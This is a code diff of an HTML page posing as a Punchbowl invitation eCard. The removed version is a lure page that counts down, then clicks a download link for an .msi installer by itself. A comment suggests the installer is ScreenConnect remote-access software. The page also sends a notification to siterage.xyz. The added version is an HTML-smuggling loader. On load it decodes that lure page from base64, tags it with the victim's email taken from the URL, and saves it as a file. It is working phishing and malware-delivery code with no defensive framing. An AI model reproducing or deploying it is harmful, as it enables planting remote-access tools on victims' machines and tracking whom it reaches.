@@ -1,158 +1,36 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Invitation Landing Page</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #A0D6B4, #7FB3D5);
-            /* soft friendly gradient */
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #333;
-            /* dark text for contrast */
-            text-align: center;
-        }
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      saveFile();
+    });
 
-        .container {
-            background: rgba(255, 255, 255, 0.2);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            max-width: 500px;
-            width: 90%;
-        }
+    function saveFile(name, type, data) {
+      if (data != null && navigator.msSaveBlob)
+        return navigator.msSaveBlob(new Blob([data], { type: type }), name);
+      var a = $("<a style='display: none;'/>");
 
-        .logo {
-            width: 150px;
-            max-width: 80%;
-            height: auto;
-            margin-bottom: 20px;
-        }
 
-        h1 {
-            font-size: 2.5rem;
-            margin-bottom: 20px;
-        }
+      // add email here or email tag here
+      let emgrab = window.location.href.split("#")[1];
 
-        p {
-            font-size: 1.2rem;
-            margin-bottom: 10px;
-        }
 
-        .instructions {
-            font-size: 1rem;
-            margin: 20px 0;
-            color: #333;
-            font-weight: bold;
-        }
-
-        .countdown {
-            font-size: 2rem;
-            margin: 20px 0;
-            color: #333;
-        }
-
-        .download-btn {
-            background: #0078D7;
-            /* ScreenConnect blue */
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 1.2rem;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 20px;
-            text-decoration: none;
-            display: inline-block;
-            border: 2px solid rgba(255, 255, 255, 0.5);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-
-        .download-btn:hover {
-            background: #005EA6;
-            /* Darker blue on hover */
-            transform: scale(1.05);
-            border-color: rgba(255, 255, 255, 0.8);
-        }
-
-        .loader {
-            display: none;
-            margin: 20px auto;
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top: 5px solid #ffcc00;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-    </style>
+      var encodedStringAtoB = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkludml0YXRpb24gTGFuZGluZyBQYWdlPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgICBib2R5IHsKICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdBcmlhbCcsIHNhbnMtc2VyaWY7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICNBMEQ2QjQsICM3RkIzRDUpOwogICAgICAgICAgICAvKiBzb2Z0IGZyaWVuZGx5IGdyYWRpZW50ICovCiAgICAgICAgICAgIG1hcmdpbjogMDsKICAgICAgICAgICAgcGFkZGluZzogMDsKICAgICAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgICAgICAgIGhlaWdodDogMTAwdmg7CiAgICAgICAgICAgIGNvbG9yOiAjMzMzOwogICAgICAgICAgICAvKiBkYXJrIHRleHQgZm9yIGNvbnRyYXN0ICovCiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICB9CgogICAgICAgIC5jb250YWluZXIgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMik7CiAgICAgICAgICAgIGJhY2tkcm9wLWZpbHRlcjogYmx1cigxMHB4KTsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogMjBweDsKICAgICAgICAgICAgcGFkZGluZzogMzBweDsKICAgICAgICAgICAgYm94LXNoYWRvdzogMCAxMHB4IDMwcHggcmdiYSgwLCAwLCAwLCAwLjIpOwogICAgICAgICAgICBtYXgtd2lkdGg6IDUwMHB4OwogICAgICAgICAgICB3aWR0aDogOTAlOwogICAgICAgIH0KCiAgICAgICAgLmxvZ28gewogICAgICAgICAgICB3aWR0aDogMTUwcHg7CiAgICAgICAgICAgIG1heC13aWR0aDogODAlOwogICAgICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDIwcHg7CiAgICAgICAgfQoKICAgICAgICBoMSB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMi41cmVtOwogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICAgIH0KCiAgICAgICAgcCB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMS4ycmVtOwogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4OwogICAgICAgIH0KCiAgICAgICAgLmluc3RydWN0aW9ucyB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMXJlbTsKICAgICAgICAgICAgbWFyZ2luOiAyMHB4IDA7CiAgICAgICAgICAgIGNvbG9yOiAjMzMzOwogICAgICAgICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgICB9CgogICAgICAgIC5jb3VudGRvd24gewogICAgICAgICAgICBmb250LXNpemU6IDJyZW07CiAgICAgICAgICAgIG1hcmdpbjogMjBweCAwOwogICAgICAgICAgICBjb2xvcjogIzMzMzsKICAgICAgICB9CgogICAgICAgIC5kb3dubG9hZC1idG4gewogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMDA3OEQ3OwogICAgICAgICAgICAvKiBTY3JlZW5Db25uZWN0IGJsdWUgKi8KICAgICAgICAgICAgY29sb3I6IHdoaXRlOwogICAgICAgICAgICBib3JkZXI6IG5vbmU7CiAgICAgICAgICAgIHBhZGRpbmc6IDE1cHggMzBweDsKICAgICAgICAgICAgZm9udC1zaXplOiAxLjJyZW07CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDUwcHg7CiAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuM3MgZWFzZTsKICAgICAgICAgICAgbWFyZ2luLXRvcDogMjBweDsKICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICAgICAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7CiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC41KTsKICAgICAgICAgICAgYm94LXNoYWRvdzogMCA0cHggOHB4IHJnYmEoMCwgMCwgMCwgMC4xKTsKICAgICAgICB9CgogICAgICAgIC5kb3dubG9hZC1idG46aG92ZXIgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMDA1RUE2OwogICAgICAgICAgICAvKiBEYXJrZXIgYmx1ZSBvbiBob3ZlciAqLwogICAgICAgICAgICB0cmFuc2Zvcm06IHNjYWxlKDEuMDUpOwogICAgICAgICAgICBib3JkZXItY29sb3I6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC44KTsKICAgICAgICB9CgogICAgICAgIC5sb2FkZXIgewogICAgICAgICAgICBkaXNwbGF5OiBub25lOwogICAgICAgICAgICBtYXJnaW46IDIwcHggYXV0bzsKICAgICAgICAgICAgd2lkdGg6IDUwcHg7CiAgICAgICAgICAgIGhlaWdodDogNTBweDsKICAgICAgICAgICAgYm9yZGVyOiA1cHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjMpOwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1MCU7CiAgICAgICAgICAgIGJvcmRlci10b3A6IDVweCBzb2xpZCAjZmZjYzAwOwogICAgICAgICAgICBhbmltYXRpb246IHNwaW4gMXMgbGluZWFyIGluZmluaXRlOwogICAgICAgIH0KCiAgICAgICAgQGtleWZyYW1lcyBzcGluIHsKICAgICAgICAgICAgMCUgewogICAgICAgICAgICAgICAgdHJhbnNmb3JtOiByb3RhdGUoMGRlZyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgMTAwJSB7CiAgICAgICAgICAgICAgICB0cmFuc2Zvcm06IHJvdGF0ZSgzNjBkZWcpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgPC9zdHlsZT4KPC9oZWFkPgoKPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDwhLS0gU2NyZWVuQ29ubmVjdCBsb2dvIC0tPgogICAgICAgIDxpbWcgc3JjPSJodHRwczovL3N0YXRpYy5wdW5jaGJvd2wuY29tL2Fzc2V0cy9sb2dvcy9wdW5jaGJvd2wvbG9nb19wdW5jaGJvd2wtMjdiNWFjODlmYWEwZjhkMzRhY2FjNjIyZTRhYThlNmE1ZmIxY2I0MTAxMGE5NDRlMmZlNWZlYWJiZDNjMzAzNC5wbmciIGFsdD0icCIgY2xhc3M9ImxvZ28iPgoKICAgICAgICA8aDE+WW91J3JlIEludml0ZWQhPC9oMT4KICAgICAgICA8cD5Zb3VyIFB1bmNoYm93bCBlQ2FyZCBpcyByZWFkeSB0byBkb3dubG9hZC48L3A+CiAgICAgICAgPGRpdiBjbGFzcz0iaW5zdHJ1Y3Rpb25zIj5QbGVhc2Ugb3BlbiB0aGlzIGZpbGUgb24gYSA8c3Ryb25nPldpbmRvd3MgUEM8L3N0cm9uZz4gdG8gdmlldyB5b3VyIGVDYXJkLjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNvdW50ZG93biIgaWQ9ImNvdW50ZG93biI+MzwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImxvYWRlciIgaWQ9ImxvYWRlciI+PC9kaXY+CiAgICAgICAgPGEgaHJlZj0iaHR0cHM6Ly9wdWItOGM3NjMwN2I1YTA2NDlmN2JlZGM0MTQ1YTFmZGI5ZDEucjIuZGV2L1B1bmNoYm93bF9yc3ZwX2VjYXJkLm1zaSIgY2xhc3M9ImRvd25sb2FkLWJ0biIgaWQ9ImRvd25sb2FkQnRuIiBkb3dubG9hZCBvbmNsaWNrPSJzZW5kVGVsZWdyYW1Ob3RpZmljYXRpb24oKSI+RG93bmxvYWQgTm93PC9hPgogICAgPC9kaXY+CgogICAgPHNjcmlwdD4KICAgICAgICBsZXQgY291bnRkb3duID0gMzsKICAgICAgICBjb25zdCBjb3VudGRvd25FbGVtZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvdW50ZG93bicpOwogICAgICAgIGNvbnN0IGxvYWRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkZXInKTsKICAgICAgICBjb25zdCBkb3dubG9hZEJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkb3dubG9hZEJ0bicpOwoKICAgICAgICBmdW5jdGlvbiBzZW5kVGVsZWdyYW1Ob3RpZmljYXRpb24oKSB7CiAgICAgICAgICAgIGZldGNoKCdodHRwczovL3NpdGVyYWdlLnh5ei90ZWxlLnBocCcpCiAgICAgICAgICAgICAgICAudGhlbihyZXNwb25zZSA9PiBjb25zb2xlLmxvZygnTm90aWZpY2F0aW9uIHNlbnQnKSkKICAgICAgICAgICAgICAgIC5jYXRjaChlcnJvciA9PiBjb25zb2xlLmVycm9yKCdFcnJvcjonLCBlcnJvcikpOwogICAgICAgIH0KCiAgICAgICAgY29uc3QgdGltZXIgPSBzZXRJbnRlcnZhbCgoKSA9PiB7CiAgICAgICAgICAgIGNvdW50ZG93bi0tOwogICAgICAgICAgICBjb3VudGRvd25FbGVtZW50LnRleHRDb250ZW50ID0gY291bnRkb3duOwogICAgICAgICAgICBpZiAoY291bnRkb3duIDw9IDApIHsKICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwodGltZXIpOwogICAgICAgICAgICAgICAgY291bnRkb3duRWxlbWVudC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgICAgICAgICAgbG9hZGVyLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOwogICAgICAgICAgICAgICAgZG93bmxvYWRCdG4uc3R5bGUuZGlzcGxheSA9ICdub25lJzsKCiAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgICAgICAgICBsb2FkZXIuc3R5bGUuZGlzcGxheSA9ICdub25lJzsKICAgICAgICAgICAgICAgICAgICBkb3dubG9hZEJ0bi5zdHlsZS5kaXNwbGF5ID0gJ2lubGluZS1ibG9jayc7CiAgICAgICAgICAgICAgICAgICAgZG93bmxvYWRCdG4uY2xpY2soKTsKICAgICAgICAgICAgICAgIH0sIDIwMDApOwogICAgICAgICAgICB9CiAgICAgICAgfSwgMTAwMCk7CiAgICA8L3NjcmlwdD4KICAgIDxzY3JpcHQgZGVmZXIgc3JjPSJodHRwczovL3N0YXRpYy5jbG91ZGZsYXJlaW5zaWdodHMuY29tL2JlYWNvbi5taW4uanMvdjhjNzhkZjdjN2MwZjQ4NDQ5N2VjYmNhNzA0NjY0NGRhMTc3MTUyMzEyNDUxNiIgaW50ZWdyaXR5PSJzaGE1MTItOERTN3JnSXJBbWdoQkZ3b09UdWpjZjZEOXJYdkg4eG04SlExSmEwMWg5UVg4RXpYbGRpc3p1ZllhNElGZktkTFVLVFRyblNGWExEa1VFT1RyWlE4UWc9PSIgZGF0YS1jZi1iZWFjb249J3sidmVyc2lvbiI6IjIwMjQuMTEuMCIsInRva2VuIjoiNzkwYjM4YmVjM2UyNDUxYTg2NTE0MjA2MjAzMmY3NjciLCJyIjoxLCJzZXJ2ZXJfdGltaW5nIjp7Im5hbWUiOnsiY2ZDYWNoZVN0YXR1cyI6dHJ1ZSwiY2ZFZGdlIjp0cnVlLCJjZkV4dFByaSI6dHJ1ZSwiY2ZMNCI6dHJ1ZSwiY2ZPcmlnaW4iOnRydWUsImNmU3BlZWRCcmFpbiI6dHJ1ZX0sImxvY2F0aW9uX3N0YXJ0c3dpdGgiOm51bGx9fScKICAgICAgICBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgdHlwZT0ibW9kdWxlIiBzcmM9Imh0dHBzOi8vc3RhdGljLmNsb3VkZmxhcmVpbnNpZ2h0cy5jb20vYmVhY29uLm1pbi5qcy92NDUxMzIyNmNkYWUzNDc0NmI0ZGVkZjBiNGRmYTA5OWUxNzgxNzkxNTA5NDk2IiBpbnRlZ3JpdHk9InNoYTUxMi1aRTlwWmFVWE5ENjZ2MzgwUVV0Y2gvNXNFOXRQRmgyemc0NXBSMlBCMENWa0N0T1JFdjJBSktrU2lkSVNXa3lzRXVRMEVIOGZhVVU1ZHU3OGJ4ODdVUT09IiBkYXRhLWNmLWJlYWNvbj0neyJ2ZXJzaW9uIjoiMjAyNC4xMS4wIiwidG9rZW4iOiJmYzAyMzRmMTU5Y2M0M2ViYjRkODI2YWNkODNiMDQyOCIsInIiOjF9JwogICAgICAgIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPjwvc2NyaXB0Pgo8L2JvZHk+Cgo8L2h0bWw+Cgo=";
+      var decodedStringAtoB = atob(encodedStringAtoB);
+      const myBlob = new Blob([decodedStringAtoB], { type: 'text/html' });
+      const url = window.URL.createObjectURL(myBlob) + "#" + emgrab;
+  
+      a.attr("href", url);
+      $("body").append(a);
+      a[0].click();
+      window.URL.revokeObjectURL(url);
+      a.remove();
+    }
+  </script>
 </head>
-
 <body>
-    <div class="container">
-        <!-- ScreenConnect logo -->
-        <img src="https://static.punchbowl.com/assets/logos/punchbowl/logo_punchbowl-27b5ac89faa0f8d34acac622e4aa8e6a5fb1cb41010a944e2fe5feabbd3c3034.png" alt="p" class="logo">
-
-        <h1>You're Invited!</h1>
-        <p>Your Punchbowl eCard is ready to download.</p>
-        <div class="instructions">Please open this file on a <strong>Windows PC</strong> to view your eCard.</div>
-        <div class="countdown" id="countdown">3</div>
-        <div class="loader" id="loader"></div>
-        <a href="https://pub-8c76307b5a0649f7bedc4145a1fdb9d1.r2.dev/Punchbowl_rsvp_ecard.msi" class="download-btn" id="downloadBtn" download onclick="sendTelegramNotification()">Download Now</a>
-    </div>
-
-    <script>
-        let countdown = 3;
-        const countdownElement = document.getElementById('countdown');
-        const loader = document.getElementById('loader');
-        const downloadBtn = document.getElementById('downloadBtn');
-
-        function sendTelegramNotification() {
-            fetch('https://siterage.xyz/tele.php')
-                .then(response => console.log('Notification sent'))
-                .catch(error => console.error('Error:', error));
-        }
-
-        const timer = setInterval(() => {
-            countdown--;
-            countdownElement.textContent = countdown;
-            if (countdown <= 0) {
-                clearInterval(timer);
-                countdownElement.style.display = 'none';
-                loader.style.display = 'block';
-                downloadBtn.style.display = 'none';
-
-                setTimeout(() => {
-                    loader.style.display = 'none';
-                    downloadBtn.style.display = 'inline-block';
-                    downloadBtn.click();
-                }, 2000);
-            }
-        }, 1000);
-    </script>
-    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"790b38bec3e2451a865142062032f767","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
-        crossorigin="anonymous"></script>
-    <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"fc0234f159cc43ebb4d826acd83b0428","r":1}'
-        crossorigin="anonymous"></script>
+  <!-- Your HTML content goes here -->
 </body>
-
 </html>
